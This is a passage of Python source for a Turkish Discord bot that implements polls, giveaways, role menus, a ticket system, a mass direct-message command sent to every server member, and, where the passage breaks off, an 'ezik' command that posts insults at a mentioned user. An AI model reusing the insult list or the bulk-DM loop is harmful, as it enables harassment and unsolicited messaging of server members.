            value="• Maksimum 10 seçenek ekleyebilirsin\n• Seçenekleri virgülle ayır\n• Soru ve seçenekleri | ile ayır",
            inline=False
        )
        embed.set_footer(text="DEHŞET Bot | Anket Sistemi")
        await ctx.reply(embed=embed)
        return
    
    if "|" not in icerik:
        await ctx.reply("❌ Yanlış format! Kullanım: `!anket <soru> | <seçenek1>, <seçenek2>, ...`")
        return
    
    parts = icerik.split("|")
    soru = parts[0].strip()
    secenekler = parts[1].strip() if len(parts) > 1 else ""
    
    options = [o.strip() for o in secenekler.split(",")][:10]
    
    if len(options) < 2:
        await ctx.reply("❌ En az 2 seçenek gerekli!")
        return
    
    emojis = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    
    description = ""
    for i, option in enumerate(options):
        description += f"{emojis[i]} {option}\n"
    
    embed = discord.Embed(
        title=f"📊 {soru}",
        description=description,
        color=0x3498db,
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text=f"Anket: {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
    
    msg = await ctx.reply(embed=embed)
    
    for i in range(len(options)):
        await msg.add_reaction(emojis[i])

@bot.command(name="çekiliş", aliases=["cekilis", "giveaway"])
async def prefix_cekilis(ctx, *, icerik: str = None):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("❌ Bu komutu kullanma yetkiniz yok!")
        return
    
    if not icerik:
        embed = discord.Embed(
            title="🎉 ÇEKİLİŞ KOMUTU",
            description="Çekiliş başlatmak için aşağıdaki formatı kullan:",
            color=0xff69b4,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(
            name="📝 Kullanım",
            value="`!çekiliş <süre> | <ödül> | [kazanan sayısı]`",
            inline=False
        )
        embed.add_field(
            name="📌 Örnekler",
            value=(
                "`!çekiliş 1h | Nitro` - 1 saat, 1 kazanan\n"
                "`!çekiliş 30m | Discord Nitro | 3` - 30 dk, 3 kazanan\n"
                "`!çekiliş 1d | VIP Rol` - 1 gün, 1 kazanan"
            ),
            inline=False
        )
        embed.add_field(
            name="⏱️ Süre Formatları",
            value="• `s` veya `sn` = saniye\n• `m` veya `dk` = dakika\n• `h` veya `sa` = saat\n• `d` veya `gün` = gün",
            inline=False
        )
        embed.set_footer(text="DEHŞET Bot | Çekiliş Sistemi")
        await ctx.reply(embed=embed)
        return
    
    parts = [p.strip() for p in icerik.split("|")]
    if len(parts) < 2:
        await ctx.reply("❌ Yanlış format! Kullanım: `!çekiliş <süre> | <ödül> | [kazanan sayısı]`")
        return
    
    süre = parts[0]
    ödül = parts[1]
    kazanan_sayısı = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 1
    
    time_units = {"s": 1, "sn": 1, "d": 86400, "gün": 86400, "h": 3600, "sa": 3600, "m": 60, "dk": 60}
    try:
        unit = ""
        for key in time_units:
            if süre.lower().endswith(key):
                unit = key
                break
        if not unit:
            unit = "m"
        amount = int(süre.lower().replace(unit, "").strip())
        seconds = amount * time_units.get(unit, 60)
    except:
        await ctx.reply("❌ Geçersiz süre! Örnek: 1h, 30m, 1d")
        return
    
    end_time = datetime.datetime.now() + datetime.timedelta(seconds=seconds)
    
    embed = discord.Embed(
        title="🎉 ÇEKİLİŞ 🎉",
        description=f"**Ödül:** {ödül}\n**Kazanan Sayısı:** {kazanan_sayısı}\n**Bitiş:** <t:{int(end_time.timestamp())}:R>",
        color=0xff69b4,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Katılmak için", value="🎉 emojisine tıkla!", inline=False)
    embed.set_footer(text=f"Başlatan: {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
    
    msg = await ctx.reply(embed=embed)
    await msg.add_reaction("🎉")
    
    active_giveaways[str(msg.id)] = {
        "channel_id": ctx.channel.id,
        "end_time": end_time.timestamp(),
        "prize": ödül,
        "winners": kazanan_sayısı,
        "host": ctx.author.id
    }
    
    await asyncio.sleep(seconds)
    
    if str(msg.id) in active_giveaways:
        try:
            msg = await ctx.channel.fetch_message(msg.id)
            reaction = discord.utils.get(msg.reactions, emoji="🎉")
            
            if reaction:
                users = [u async for u in reaction.users() if not u.bot]
                
                if len(users) == 0:
                    embed.description = f"**Ödül:** {ödül}\n\n❌ Yeterli katılımcı yok!"
                    embed.color = 0xff0000
                else:
                    winners = random.sample(users, min(kazanan_sayısı, len(users)))
                    winner_mentions = ", ".join([w.mention for w in winners])
                    embed.description = f"**Ödül:** {ödül}\n\n🎉 **Kazanan(lar):** {winner_mentions}"
                    embed.color = 0x00ff00
                    await ctx.channel.send(f"🎉 Tebrikler {winner_mentions}! **{ödül}** kazandınız!")
                
                await msg.edit(embed=embed)
            
            del active_giveaways[str(msg.id)]
        except:
            pass

@bot.command(name="rolmenu")
async def prefix_rolmenu(ctx, *, icerik: str = None):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("❌ Bu komutu kullanma yetkiniz yok!")
        return
    
    if not icerik:
        embed = discord.Embed(
            title="🎭 ROL MENÜ KOMUTU",
            description="Rol menüsü oluşturmak için aşağıdaki formatı kullan:",
            color=0x9b59b6,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(
            name="📝 Kullanım",
            value="`!rolmenu <başlık> | <emoji>:<@rol>, <emoji>:<@rol>, ...`",
            inline=False
        )
        embed.add_field(
            name="📌 Örnek",
            value="`!rolmenu Renk Seç | 🔴:@Kırmızı, 🔵:@Mavi, 🟢:@Yeşil`",
            inline=False
        )
        embed.add_field(
            name="ℹ️ Bilgi",
            value="• Emoji ve rol arasına `:` koy\n• Birden fazla rol için virgül kullan\n• Üyeler emojiye tıklayarak rol alır/bırakır",
            inline=False
        )
        embed.set_footer(text="DEHŞET Bot | Rol Menü Sistemi")
        await ctx.reply(embed=embed)
        return
    
    if "|" not in icerik:
        await ctx.reply("❌ Yanlış format! Kullanım: `!rolmenu <başlık> | <emoji>:<@rol>, ...`")
        return
    
    parts = icerik.split("|")
    başlık = parts[0].strip()
    roller_str = parts[1].strip() if len(parts) > 1 else ""
    
    role_list = [r.strip() for r in roller_str.split(",")]
    role_data = {}
    description = ""
    
    for item in role_list:
        try:
            item_parts = item.split(":")
            emoji = item_parts[0].strip()
            role_mention = item_parts[1].strip()
            role_id = int(role_mention.replace("<@&", "").replace(">", ""))
            role = ctx.guild.get_role(role_id)
            if role:
                role_data[emoji] = role_id
                description += f"{emoji} - {role.mention}\n"
        except:
            continue
    
    if not role_data:
        await ctx.reply("❌ Geçerli rol bulunamadı! Format: `emoji:@rol`")
        return
    
    embed = discord.Embed(
        title=f"🎭 {başlık}",
        description=description + "\n**Rol almak/bırakmak için emojiye tıkla!**",
        color=0x9b59b6,
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text=f"Oluşturan: {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
    
    msg = await ctx.reply(embed=embed)
    
    ROLE_MENUS[str(msg.id)] = role_data
    save_role_menus()
    
    for emoji in role_data.keys():
        try:
            await msg.add_reaction(emoji)
        except:
            pass

# ==================== TICKET SİSTEMİ ====================

class TicketButton(discord.ui.Button):
    def __init__(self):
        super().__init__(
            label="🎫 Ticket Aç",
            style=discord.ButtonStyle.primary,
            custom_id="ticket_create_button"
        )
    
    async def callback(self, interaction: discord.Interaction):
        guild_id = str(interaction.guild.id)
        
        if guild_id not in TICKET_SETTINGS:
            await interaction.response.send_message("❌ Ticket sistemi henüz ayarlanmamış!", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        
        for ticket_id, ticket_data in TICKETS.items():
            if ticket_data.get("user_id") == user_id and ticket_data.get("guild_id") == guild_id and ticket_data.get("status") == "open":
                await interaction.response.send_message(f"❌ Zaten açık bir ticket'ınız var! <#{ticket_data['channel_id']}>", ephemeral=True)
                return
        
        TICKET_SETTINGS[guild_id]["ticket_count"] = TICKET_SETTINGS[guild_id].get("ticket_count", 0) + 1
        ticket_number = TICKET_SETTINGS[guild_id]["ticket_count"]
        save_ticket_settings()
        
        support_role = interaction.guild.get_role(TICKET_SETTINGS[guild_id]["support_role"])
        
        overwrites = {
            interaction.guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
            interaction.guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True, manage_channels=True)
        }
        
        if support_role:
            overwrites[support_role] = discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True)
        
        try:
            channel = await interaction.guild.create_text_channel(
                name=f"ticket-{ticket_number}",
                overwrites=overwrites,
                reason=f"Ticket açıldı: {interaction.user.name}"
            )
            
            TICKETS[str(channel.id)] = {
                "ticket_number": ticket_number,
                "user_id": user_id,
                "user_name": interaction.user.name,
                "guild_id": guild_id,
                "channel_id": channel.id,
                "subject": "Butonla açıldı",
                "status": "open",
                "created_at": datetime.datetime.now().isoformat()
            }
            save_tickets()
            
            close_view = TicketCloseView()
            
            welcome_embed = discord.Embed(
                title=f"🎫 Ticket #{ticket_number}",
                description=f"Merhaba {interaction.user.mention}!\n\nDestek talebiniz oluşturuldu. Lütfen sorununuzu açıklayın, bir yetkili en kısa sürede size yardımcı olacaktır.",
                color=0x3498db,
                timestamp=datetime.datetime.now()
            )
            welcome_embed.add_field(name="👤 Açan", value=interaction.user.mention, inline=True)
            welcome_embed.add_field(name="📅 Tarih", value=f"<t:{int(datetime.datetime.now().timestamp())}:F>", inline=True)
            welcome_embed.add_field(name="❌ Kapatmak İçin", value="Aşağıdaki butona tıkla veya `!ticketkapat` yaz", inline=False)
            welcome_embed.set_thumbnail(url=interaction.user.display_avatar.url)
            welcome_embed.set_footer(text="DEHŞET Ticket Sistemi")
            
            await channel.send(content=f"{interaction.user.mention} {support_role.mention if support_role else ''}", embed=welcome_embed, view=close_view)
            
            await interaction.response.send_message(f"✅ Ticket'ınız oluşturuldu! {channel.mention}", ephemeral=True)
            
            log_channel_id = TICKET_SETTINGS[guild_id].get("log_channel")
            if log_channel_id:
                log_channel = bot.get_channel(log_channel_id)
                if log_channel:
                    log_embed = discord.Embed(
                        title="🎫 YENİ TICKET AÇILDI",
                        color=0x00ff00,
                        timestamp=datetime.datetime.now()
                    )
                    log_embed.add_field(name="👤 Açan", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=True)
                    log_embed.add_field(name="🎫 Ticket", value=channel.mention, inline=True)
                    log_embed.add_field(name="📋 Açılış", value="Buton ile açıldı", inline=False)
                    log_embed.set_thumbnail(url=interaction.user.display_avatar.url)
                    log_embed.set_footer(text=f"Ticket #{ticket_number}")
                    await log_channel.send(embed=log_embed)
            
        except discord.Forbidden:
            await interaction.response.send_message("❌ Kanal oluşturma yetkim yok!", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Hata: {e}", ephemeral=True)

class TicketCloseButton(discord.ui.Button):
    def __init__(self):
        super().__init__(
            label="🔒 Ticket Kapat",
            style=discord.ButtonStyle.danger,
            custom_id="ticket_close_button"
        )
    
    async def callback(self, interaction: discord.Interaction):
        channel_id = str(interaction.channel.id)
        
        if channel_id not in TICKETS:
            await interaction.response.send_message("❌ Bu kanal bir ticket değil!", ephemeral=True)
            return
        
        ticket = TICKETS[channel_id]
        
        if ticket["status"] == "closed":
            await interaction.response.send_message("❌ Bu ticket zaten kapatılmış!", ephemeral=True)
            return
        
        if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id) and str(interaction.user.id) != ticket["user_id"]:
            await interaction.response.send_message("❌ Bu ticket'ı kapatma yetkiniz yok!", ephemeral=True)
            return
        
        guild_id = ticket["guild_id"]
        
        embed = discord.Embed(
            title="🔒 TICKET KAPATILIYOR",
            description="Bu ticket 5 saniye içinde silinecek...",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="👤 Kapatan", value=interaction.user.mention, inline=True)
        embed.set_footer(text="DEHŞET Ticket Sistemi")
        
        await interaction.response.send_message(embed=embed)
        
        log_channel_id = TICKET_SETTINGS.get(guild_id, {}).get("log_channel")
        if log_channel_id:
            log_channel = bot.get_channel(log_channel_id)
            if log_channel:
                messages = []
                async for msg in interaction.channel.history(limit=100, oldest_first=True):
                    messages.append(f"[{msg.created_at.strftime('%H:%M')}] {msg.author.name}: {msg.content[:100]}")
                
                transcript = "\n".join(messages[-50:])
                
                log_embed = discord.Embed(
                    title="🔒 TICKET KAPATILDI",
                    color=0xff0000,
                    timestamp=datetime.datetime.now()
                )
                log_embed.add_field(name="🎫 Ticket", value=f"#{ticket['ticket_number']}", inline=True)
                log_embed.add_field(name="👤 Açan", value=f"<@{ticket['user_id']}>", inline=True)
                log_embed.add_field(name="🔒 Kapatan", value=interaction.user.mention, inline=True)
                log_embed.add_field(name="📋 Konu", value=f"```{ticket['subject']}```", inline=False)
                log_embed.add_field(name="📜 Son Mesajlar", value=f"```{transcript[-1000:] if transcript else 'Mesaj yok'}```", inline=False)
                log_embed.set_footer(text=f"Ticket #{ticket['ticket_number']}")
                
                await log_channel.send(embed=log_embed)
        
        TICKETS[channel_id]["status"] = "closed"
        TICKETS[channel_id]["closed_by"] = interaction.user.id
        TICKETS[channel_id]["closed_at"] = datetime.datetime.now().isoformat()
        save_tickets()
        
        await asyncio.sleep(5)
        
        try:
            await interaction.channel.delete(reason="Ticket kapatıldı")
        except:
            pass

class TicketView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(TicketButton())

class TicketCloseView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(TicketCloseButton())

@bot.command(name="ticketpanel")
async def ticket_panel(ctx):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("❌ Bu komutu kullanma yetkiniz yok!")
        return
    
    guild_id = str(ctx.guild.id)
    
    if guild_id not in TICKET_SETTINGS:
        await ctx.reply("❌ Önce `!ticketayar #log-kanal @yetkili-rol` ile sistemi ayarla!")
        return
    
    embed = discord.Embed(
        title="🎫 DESTEK TALEBİ",
        description=(
            "Yardıma mı ihtiyacınız var?\n\n"
            "Aşağıdaki butona tıklayarak, botumuzu kullanabilmek icin hak talep edebilirsiniz!\n\n"
            "**📌 Kurallar:**\n"
            "• Gereksiz ticket açmayın\n"
            "• İsteğinizi detaylı açıklayın\n"
            "• Sabırlı olun, ownerlar meşgul olabilir"
        ),
        color=0x3498db,
        timestamp=datetime.datetime.now()
    )
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
    embed.set_footer(text="DEHŞET Ticket Sistemi", icon_url=bot.user.display_avatar.url)
    
    view = TicketView()
    
    await ctx.message.delete()
    await ctx.channel.send(embed=embed, view=view)

@bot.command(name="ticketayar")
async def ticket_setup(ctx, log_kanal: discord.TextChannel = None, yetkili_rol: discord.Role = None):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("❌ Bu komutu kullanma yetkiniz yok!")
        return
    
    if not log_kanal or not yetkili_rol:
        embed = discord.Embed(
            title="🎫 TICKET AYAR KOMUTU",
            description="Ticket sistemini ayarlamak için aşağıdaki formatı kullan:",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(
            name="📝 Kullanım",
            value="`!ticketayar #log-kanal @yetkili-rol`",
            inline=False
        )
        embed.add_field(
            name="📌 Örnek",
            value="`!ticketayar #ticket-log @Yetkili`",
            inline=False
        )
        embed.add_field(
            name="ℹ️ Bilgi",
            value="• Log kanalı: Ticket işlemleri buraya kaydedilir\n• Yetkili rol: Bu rol ticket'ları görebilir",
            inline=False
        )
        embed.set_footer(text="DEHŞET Bot | Ticket Sistemi")
        await ctx.reply(embed=embed)
        return
    
    guild_id = str(ctx.guild.id)
    TICKET_SETTINGS[guild_id] = {
        "log_channel": log_kanal.id,
        "support_role": yetkili_rol.id,
        "ticket_count": TICKET_SETTINGS.get(guild_id, {}).get("ticket_count", 0)
    }
    save_ticket_settings()
    
    embed = discord.Embed(
        title="✅ TICKET SİSTEMİ AYARLANDI",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="📋 Log Kanalı", value=log_kanal.mention, inline=True)
    embed.add_field(name="👥 Yetkili Rol", value=yetkili_rol.mention, inline=True)
    embed.set_footer(text="DEHŞET Bot | Ticket Sistemi")
    
    await ctx.reply(embed=embed)

@bot.command(name="ticket")
async def create_ticket(ctx, *, konu: str = None):
    guild_id = str(ctx.guild.id)
    
    if guild_id not in TICKET_SETTINGS:
        await ctx.reply("❌ Ticket sistemi henüz ayarlanmamış! Yetkili `!ticketayar` komutunu kullanmalı.")
        return
    
    if not konu:
        embed = discord.Embed(
            title="🎫 TICKET KOMUTU",
            description="Destek talebi açmak için aşağıdaki formatı kullan:",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(
            name="📝 Kullanım",
            value="`!ticket <konu>`",
            inline=False
        )
        embed.add_field(
            name="📌 Örnek",
            value="`!ticket Ödeme sorunu yaşıyorum`",
            inline=False
        )
        embed.set_footer(text="DEHŞET Bot | Ticket Sistemi")
        await ctx.reply(embed=embed)
        return
    
    user_id = str(ctx.author.id)
    
    for ticket_id, ticket_data in TICKETS.items():
        if ticket_data.get("user_id") == user_id and ticket_data.get("guild_id") == guild_id and ticket_data.get("status") == "open":
            await ctx.reply(f"❌ Zaten açık bir ticket'ınız var! <#{ticket_data['channel_id']}>")
            return
    
    TICKET_SETTINGS[guild_id]["ticket_count"] = TICKET_SETTINGS[guild_id].get("ticket_count", 0) + 1
    ticket_number = TICKET_SETTINGS[guild_id]["ticket_count"]
    save_ticket_settings()
    
    support_role = ctx.guild.get_role(TICKET_SETTINGS[guild_id]["support_role"])
    
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(view_channel=False),
        ctx.author: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
        ctx.guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True, manage_channels=True)
    }
    
    if support_role:
        overwrites[support_role] = discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True)
    
    try:
        channel = await ctx.guild.create_text_channel(
            name=f"ticket-{ticket_number}",
            overwrites=overwrites,
            reason=f"Ticket açıldı: {ctx.author.name}"
        )
        
        TICKETS[str(channel.id)] = {
            "ticket_number": ticket_number,
            "user_id": user_id,
            "user_name": ctx.author.name,
            "guild_id": guild_id,
            "channel_id": channel.id,
            "subject": konu,
            "status": "open",
            "created_at": datetime.datetime.now().isoformat()
        }
        save_tickets()
        
        welcome_embed = discord.Embed(
            title=f"🎫 Ticket #{ticket_number}",
            description=f"Merhaba {ctx.author.mention}!\n\nDestek talebiniz oluşturuldu. Bir yetkili en kısa sürede size yardımcı olacaktır.",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        welcome_embed.add_field(name="📋 Konu", value=f"```{konu}```", inline=False)
        welcome_embed.add_field(name="👤 Açan", value=ctx.author.mention, inline=True)
        welcome_embed.add_field(name="📅 Tarih", value=f"<t:{int(datetime.datetime.now().timestamp())}:F>", inline=True)
        welcome_embed.add_field(name="❌ Kapatmak İçin", value="`!ticketkapat`", inline=False)
        welcome_embed.set_thumbnail(url=ctx.author.display_avatar.url)
        welcome_embed.set_footer(text="DEHŞET Ticket Sistemi")
        
        await channel.send(content=f"{ctx.author.mention} {support_role.mention if support_role else ''}", embed=welcome_embed)
        
        success_embed = discord.Embed(
            title="✅ TICKET OLUŞTURULDU",
            description=f"Ticket'ınız başarıyla oluşturuldu!",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        success_embed.add_field(name="🎫 Ticket", value=channel.mention, inline=True)
        success_embed.add_field(name="📋 Konu", value=konu[:50], inline=True)
        success_embed.set_footer(text="DEHŞET Ticket Sistemi")
        
        await ctx.reply(embed=success_embed)
        
        log_channel_id = TICKET_SETTINGS[guild_id].get("log_channel")
        if log_channel_id:
            log_channel = bot.get_channel(log_channel_id)
            if log_channel:
                log_embed = discord.Embed(
                    title="🎫 YENİ TICKET AÇILDI",
                    color=0x00ff00,
                    timestamp=datetime.datetime.now()
                )
                log_embed.add_field(name="👤 Açan", value=f"{ctx.author.mention} (`{ctx.author.id}`)", inline=True)
                log_embed.add_field(name="🎫 Ticket", value=channel.mention, inline=True)
                log_embed.add_field(name="📋 Konu", value=f"```{konu}```", inline=False)
                log_embed.set_thumbnail(url=ctx.author.display_avatar.url)
                log_embed.set_footer(text=f"Ticket #{ticket_number}")
                await log_channel.send(embed=log_embed)
        
    except discord.Forbidden:
        await ctx.reply("❌ Kanal oluşturma yetkim yok!")
    except Exception as e:
        await ctx.reply(f"❌ Hata: {e}")

@bot.command(name="ticketkapat", aliases=["kapat", "closeticket"])
async def close_ticket(ctx, *, sebep: str = "Sebep belirtilmedi"):
    channel_id = str(ctx.channel.id)
    
    if channel_id not in TICKETS:
        await ctx.reply("❌ Bu kanal bir ticket değil!")
        return
    
    ticket = TICKETS[channel_id]
    
    if ticket["status"] == "closed":
        await ctx.reply("❌ Bu ticket zaten kapatılmış!")
        return
    
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id) and str(ctx.author.id) != ticket["user_id"]:
        await ctx.reply("❌ Bu ticket'ı kapatma yetkiniz yok!")
        return
    
    guild_id = ticket["guild_id"]
    
    embed = discord.Embed(
        title="🔒 TICKET KAPATILIYOR",
        description="Bu ticket 5 saniye içinde silinecek...",
        color=0xff0000,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="👤 Kapatan", value=ctx.author.mention, inline=True)
    embed.add_field(name="📋 Sebep", value=sebep, inline=True)
    embed.set_footer(text="DEHŞET Ticket Sistemi")
    
    await ctx.reply(embed=embed)
    
    log_channel_id = TICKET_SETTINGS.get(guild_id, {}).get("log_channel")
    if log_channel_id:
        log_channel = bot.get_channel(log_channel_id)
        if log_channel:
            messages = []
            async for msg in ctx.channel.history(limit=100, oldest_first=True):
                messages.append(f"[{msg.created_at.strftime('%H:%M')}] {msg.author.name}: {msg.content[:100]}")
            
            transcript = "\n".join(messages[-50:])
            
            log_embed = discord.Embed(
                title="🔒 TICKET KAPATILDI",
                color=0xff0000,
                timestamp=datetime.datetime.now()
            )
            log_embed.add_field(name="🎫 Ticket", value=f"#{ticket['ticket_number']}", inline=True)
            log_embed.add_field(name="👤 Açan", value=f"<@{ticket['user_id']}>", inline=True)
            log_embed.add_field(name="🔒 Kapatan", value=ctx.author.mention, inline=True)
            log_embed.add_field(name="📋 Konu", value=f"```{ticket['subject']}```", inline=False)
            log_embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
            log_embed.add_field(name="📜 Son Mesajlar", value=f"```{transcript[-1000:] if transcript else 'Mesaj yok'}```", inline=False)
            log_embed.set_footer(text=f"Ticket #{ticket['ticket_number']}")
            
            await log_channel.send(embed=log_embed)
    
    TICKETS[channel_id]["status"] = "closed"
    TICKETS[channel_id]["closed_by"] = ctx.author.id
    TICKETS[channel_id]["closed_at"] = datetime.datetime.now().isoformat()
    TICKETS[channel_id]["close_reason"] = sebep
    save_tickets()
    
    await asyncio.sleep(5)
    
    try:
        await ctx.channel.delete(reason=f"Ticket kapatıldı: {sebep}")
    except:
        pass

@bot.command(name="ticketekle", aliases=["adduser"])
async def add_to_ticket(ctx, kullanici: discord.Member = None):
    if not kullanici:
        embed = discord.Embed(
            title="🎫 TICKET EKLE KOMUTU",
            description="Ticket'a kullanıcı eklemek için:",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="📝 Kullanım", value="`!ticketekle @kullanıcı`", inline=False)
        embed.set_footer(text="DEHŞET Ticket Sistemi")
        await ctx.reply(embed=embed)
        return
    
    channel_id = str(ctx.channel.id)
    
    if channel_id not in TICKETS:
        await ctx.reply("❌ Bu kanal bir ticket değil!")
        return
    
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("❌ Bu komutu kullanma yetkiniz yok!")
        return
    
    await ctx.channel.set_permissions(kullanici, view_channel=True, send_messages=True, read_message_history=True)
    
    embed = discord.Embed(
        title="✅ KULLANICI EKLENDİ",
        description=f"{kullanici.mention} bu ticket'a eklendi!",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text="DEHŞET Ticket Sistemi")
    
    await ctx.reply(embed=embed)

@bot.command(name="ticketcikar", aliases=["removeuser"])
async def remove_from_ticket(ctx, kullanici: discord.Member = None):
    if not kullanici:
        embed = discord.Embed(
            title="🎫 TICKET ÇIKAR KOMUTU",
            description="Ticket'tan kullanıcı çıkarmak için:",
            color=0x3498db,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="📝 Kullanım", value="`!ticketcikar @kullanıcı`", inline=False)
        embed.set_footer(text="DEHŞET Ticket Sistemi")
        await ctx.reply(embed=embed)
        return
    
    channel_id = str(ctx.channel.id)
    
    if channel_id not in TICKETS:
        await ctx.reply("❌ Bu kanal bir ticket değil!")
        return
    
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("❌ Bu komutu kullanma yetkiniz yok!")
        return
    
    await ctx.channel.set_permissions(kullanici, overwrite=None)
    
    embed = discord.Embed(
        title="✅ KULLANICI ÇIKARILDI",
        description=f"{kullanici.mention} bu ticket'tan çıkarıldı!",
        color=0xff6600,
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text="DEHŞET Ticket Sistemi")
    
    await ctx.reply(embed=embed)

@bot.command(name="ticketlar", aliases=["tickets"])
async def list_tickets(ctx):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("❌ Bu komutu kullanma yetkiniz yok!")
        return
    
    guild_id = str(ctx.guild.id)
    open_tickets = []
    
    for ticket_id, ticket in TICKETS.items():
        if ticket.get("guild_id") == guild_id and ticket.get("status") == "open":
            open_tickets.append(ticket)
    
    if not open_tickets:
        embed = discord.Embed(
            title="🎫 AÇIK TICKET YOK",
            description="Şu anda açık ticket bulunmuyor.",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="DEHŞET Ticket Sistemi")
        await ctx.reply(embed=embed)
        return
    
    embed = discord.Embed(
        title=f"🎫 AÇIK TICKETLAR ({len(open_tickets)})",
        color=0x3498db,
        timestamp=datetime.datetime.now()
    )
    
    for ticket in open_tickets[:15]:
        embed.add_field(
            name=f"Ticket #{ticket['ticket_number']}",
            value=f"👤 <@{ticket['user_id']}>\n📋 {ticket['subject'][:30]}...\n🔗 <#{ticket['channel_id']}>",
            inline=True
        )
    
    embed.set_footer(text="DEHŞET Ticket Sistemi")
    await ctx.reply(embed=embed)

@bot.command(name="toplumesaj")
async def prefix_toplumesaj(ctx, *, mesaj):
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    
    guild = ctx.guild
    if not guild:
        await ctx.reply("Bu komut sadece sunucularda kullanılabilir!")
        return
    
    sent = 0
    failed = 0
    
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(mesaj)
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.5)
    
    embed = discord.Embed(
        title="DM Gönderimi Tamamlandı",
        description=f"**Gönderilen:** {sent}\n**Başarısız:** {failed}",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text="DEHŞET Toplum Mesaj Sistemi")
    await ctx.reply(embed=embed)

@bot.command(name="guildrol")
async def guild_role(ctx, user: discord.User, role: discord.Role):
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    
    guild = bot.get_guild(ALLOWED_LOG_GUILD_ID)
    if not guild:
        await ctx.reply("Bot'un kendi sunucusu bulunamadı!")
        return
    
    try:
        member = await guild.fetch_member(user.id)
    except:
        member = None
    
    if not member:
        await ctx.reply(f"{user.mention} bot'un sunucusunda değil!")
        return
    
    try:
        if role:
            await member.add_roles(role)
        add_credits(user.id, 10)
        
        embed = discord.Embed(
            title="✅ Guild Sahibi Rol Verildi",
            description=f"{user.mention} kullanıcısına guild sahibi rolü verildi",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Rol", value=f"{role.mention}", inline=True)
        embed.add_field(name="Verilen Hak", value="10 adet", inline=True)
        embed.add_field(name="Toplam Hak", value=f"{get_credits(user.id)} adet", inline=True)
        embed.set_footer(text=f"İşlemi Yapan: {ctx.author.name}")
        
        await ctx.reply(embed=embed)
        
        owner_user = bot.get_user(OWNER_IDS[0])
        if owner_user:
            try:
                await owner_user.send(embed=embed)
            except:
                pass
                
    except Exception as e:
        await ctx.reply(f"Hata: {str(e)}")

@bot.command(name="ezik")
async def ezik_command(ctx, user: discord.User = None):
    if not user:
        await ctx.reply("Ezilecek kullanıcı belirt! `!ezik @kullanıcı`")
        return
    
    if user.id == ctx.author.id:
        await ctx.reply("Kendini ezemezsin! 😏")
        return
    
    if user.bot:
        await ctx.reply("Bot'u ezemezsin kanka! 🤖")
        return
    
    ezilme_mesajlari = [
        f"{user.mention} sen çok eziksin be, ne yapıyorsun burada?",
        f"{user.mention} yerin dibine sok kendini! Rezil adam seni!",
        f"{user.mention} sen çok battal! Ezik herif!",
        f"{user.mention} senin gibi taşak konusu bir adam daha görmedim!",
        f"{user.mention} dıkırıklı şey seni! Kendine gel!",
        f"{user.mention} sen rezilsin abı! Bitmiş herif!",
        f"{user.mention} senin adını bile söylemek beni kirletir! Bitti gittin!",
        f"{user.mention} ayakkabımın altı senden daha değerli!",
        f"{user.mention} sen çok berbatsın! Adı yazık!",
        f"{user.mention} Yok senden daha düşük bir canlı ben görmedim! Muazzam aptal!",
